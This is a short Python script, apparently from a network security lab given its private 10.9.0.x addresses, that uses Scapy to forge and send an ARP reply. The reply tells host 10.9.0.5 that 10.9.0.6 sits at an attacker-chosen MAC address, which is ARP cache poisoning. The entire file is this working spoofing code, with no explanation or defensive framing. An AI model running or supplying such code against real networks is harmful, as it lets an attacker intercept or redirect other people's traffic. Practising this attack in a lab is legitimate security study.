from scapy.all import *

ether=Ether()
ether.src='02:42:0a:09:00:69'
ether.dst='02:42:0a:09:00:05'
#'ff:ff:ff:ff:ff:ff'

arp=ARP()
arp.op=2
arp.hwsrc='02:42:0a:09:00:69'
arp.psrc='10.9.0.6'
arp.hwdst='02:42:0a:09:00:05' 
arp.pdst='10.9.0.5'

pkt=ether/arp
sendp(pkt)
